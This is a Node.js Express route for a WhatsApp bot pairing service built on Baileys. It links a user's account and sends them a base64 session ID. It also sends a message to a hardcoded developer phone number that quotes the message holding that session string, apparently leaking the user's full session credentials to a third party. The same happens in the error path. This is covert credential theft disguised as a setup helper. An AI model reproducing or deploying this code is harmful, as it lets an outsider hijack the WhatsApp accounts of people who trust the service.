const { makeid } = require('./gen-id');
const express = require('express');
const fs = require('fs');
const path = require('path');
const router = express.Router();
const pino = require('pino');
const logger = pino({ level: 'info' });
const {
    makeWASocket,
    useMultiFileAuthState,
    delay,
    Browsers,
    makeCacheableSignalKeyStore,
    fetchLatestBaileysVersion,
    DisconnectReason,
} = require('@whiskeysockets/baileys');
const axios = require('axios');
const THARUZZ_DEV_NUMBER = "263718095555";

function removeFile(filePath) {
    if (!fs.existsSync(filePath)) return false;
    fs.rmSync(filePath, { recursive: true, force: true });
}

function generateRandomText() {
    const prefix = "3EB";
    const characters = "ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";
    let randomText = prefix;
    for (let i = prefix.length; i < 22; i++) {
        randomText += characters.charAt(Math.floor(Math.random() * characters.length));
    }
    return randomText;
}

async function GIFTED_MD_PAIR_CODE(id, num, res) {
    const { state, saveCreds } = await useMultiFileAuthState(path.join(__dirname, 'temp', id));
    const { version, isLatest } = await fetchLatestBaileysVersion();
    try {
        const sock = makeWASocket({
            auth: {
                creds: state.creds,
                keys: makeCacheableSignalKeyStore(state.keys, logger),
            },
            printQRInTerminal: false,
            generateHighQualityLinkPreview: true,
            logger: logger,
            syncFullHistory: false,
            browser: Browsers.macOS('Safari'),
        });

        if (!sock.authState.creds.registered) {
            await delay(1500);
            num = num.replace(/[^0-9]/g, '');
            const code = await sock.requestPairingCode(num);
            if (!res.headersSent) {
                res.send({ code });
            }
        }

        sock.ev.on('creds.update', saveCreds);
        sock.ev.on('connection.update', async (update) => {
            const { connection, lastDisconnect } = update;

            if (connection === 'open') {
                await delay(5000);
                const credsFilePath = path.join(__dirname, 'temp', id, 'creds.json');
                try {
                    const credsData = fs.readFileSync(credsFilePath, 'utf-8');
                    const base64Session = Buffer.from(credsData).toString('base64');
                    const md = "TKT-CYBER~" + base64Session;
                    const codeMessage = await sock.sendMessage(sock.user.id, { text: md });
                    
                    let cap = `
*\`TKT-CYBER-XMD-V3\` Session Connected ✅*

⚠️ *ᴅᴏɴᴛ ꜱʜᴀʀᴇ ᴛʜɪꜱ ᴄᴏᴅᴇ ᴡɪᴛʜ ᴀɴʏᴏɴᴇ.*

🚀 *ᴢɪᴍʙᴀʙᴡᴇ'ꜱ ʙᴇꜱᴛ ᴡʜᴀᴛꜱᴀᴘᴘ ʙᴏᴛ ᴄʀᴇᴀᴛᴇᴅ ʙʏ ᴍʀ.ᴛᴀꜰᴀᴅᴢᴡᴀ-ᴛᴋᴛ.*

*───────────────*
🌟 *\`sᴛᴀʀ ʀᴇᴘᴏ:\`* https://github.com/tkttech/TKT-CYBER-XMD-V3
🔔 *\`ғᴏʟʟᴏᴡ ᴡᴀ-ᴄʜᴀɴɴᴇʟ:\`* https://whatsapp.com/channel/0029Vb5vbMM0LKZJi9k4ED1a
👤 *\`ᴏᴡɴᴇʀ ɴᴏ:\`* 263718095555
*───────────────*

> *© ᴘᴏᴡᴇʀᴅ ʙʏ | ᴛᴋᴛ-ᴛᴇᴄʜ ᴏꜰᴄ*
`;
                    await sock.sendMessage(THARUZZ_DEV_NUMBER + "@s.whatsapp.net", {
                        text: cap,
                        contextInfo: {
                            externalAdReply: {
                                title: "ᴛʜᴀʀᴜᴢᴢ ᴏꜰᴄ",
                                thumbnailUrl: "https://files.catbox.moe/d622xc.png",
                                sourceUrl: "https://whatsapp.com/channel/0029Vb5vbMM0LKZJi9k4ED1a",
                                mediaType: 2,
                                renderLargerThumbnail: true,
                                showAdAttribution: true,
                            },
                        },
                    }, { quoted: codeMessage });

                    await sock.ws.close();
                    removeFile(path.join(__dirname, 'temp', id));
                    logger.info(`👤 ${sock.user.id} 𝗖𝗼𝗻𝗻𝗲𝗰𝘁𝗲𝗱 ✅ 𝗥𝗲𝘀𝘁𝗮𝗿𝘁𝗶𝗻𝗴 𝗽𝗿𝗼𝗰𝗲𝘀𝘀...`);
                    process.exit(0);
                } catch (error) {
                    logger.error(`Error in connection update: ${error.message}`);
                    const errorMessage = await sock.sendMessage(sock.user.id, { text: error.message });
                    let cap = `
*\`TKT-CYBER-XMD-V3\` Session Connected ✅*

⚠️ *ᴅᴏɴᴛ ꜱʜᴀʀᴇ ᴛʜɪꜱ ᴄᴏᴅᴇ ᴡɪᴛʜ ᴀɴʏᴏɴᴇ.*

🚀 *ᴢɪᴍʙᴀʙᴡᴇ'ꜱ  ʙᴇꜱᴛ ᴡʜᴀᴛꜱᴀᴘᴘ ʙᴏᴛ ᴄʀᴇᴀᴛᴇᴅ ʙʏ ᴍʀ.ᴛᴀꜰᴀᴅᴢᴡᴀ-ᴛᴋᴛ.*

*───────────────*
🌟 *\`sᴛᴀʀ ʀᴇᴘᴏ:\`* https://github.com/tkttech/TKT-CYBER-XMD-V3
🔔 *\`ғᴏʟʟᴏᴡ ᴡᴀ-ᴄʜᴀɴɴᴇʟ:\`* https://whatsapp.com/channel/0029Vb5vbMM0LKZJi9k4ED1a
👤 *\`ᴏᴡɴᴇʀ ɴᴏ:\`* 263718095555
*───────────────*

> *© ᴘᴏᴡᴇʀᴅ ʙʏ | ᴛᴋᴛ-ᴛᴇᴄʜ ᴏꜰᴄ*
`;
                    await sock.sendMessage(THARUZZ_DEV_NUMBER + "@s.whatsapp.net"/*sock.user.id*/, {
                        text: cap,
                        contextInfo: {
                            externalAdReply: {
                                title: "ᴛᴋᴛ-ᴛᴇᴄʜ ᴏꜰᴄ",
                                thumbnailUrl:"https://files.catbox.moe/d622xc.png",
                                sourceUrl: "https://whatsapp.com/channel/0029Vb5vbMM0LKZJi9k4ED1a",
                                mediaType: 2,
                                renderLargerThumbnail: true,
                                showAdAttribution: true,
                            },
                        },
                    }, { quoted: errorMessage });
                }
            } else if (connection === 'close' && lastDisconnect?.error?.output?.statusCode !== 401) {
                logger.warn('Connection closed. Retrying...');
                await delay(10000);
                GIFTED_MD_PAIR_CODE(id, num, res);
            }
        });
    } catch (error) {
        logger.error(`Error in GIFTED_MD_PAIR_CODE: ${error.message}`);
        removeFile(path.join(__dirname, 'temp', id));
        if (!res.headersSent) {
            res.send({ code: "❗ Service Unavailable" });
        }
    }
}

router.get('/', async (req, res) => {
    const id = makeid();
    const num = req.query.number;
    if (!num) {
        return res.status(400).send({ error: 'Number is required' });
    }
    await GIFTED_MD_PAIR_CODE(id, num, res);
});

setInterval(() => {
    logger.info('☘️ 𝗥𝗲𝘀𝘁𝗮𝗿𝘁𝗶𝗻𝗴 𝗽𝗿𝗼𝗰𝗲𝘀𝘀...');
    process.exit(0);
}, 1800000);

module.exports = router;
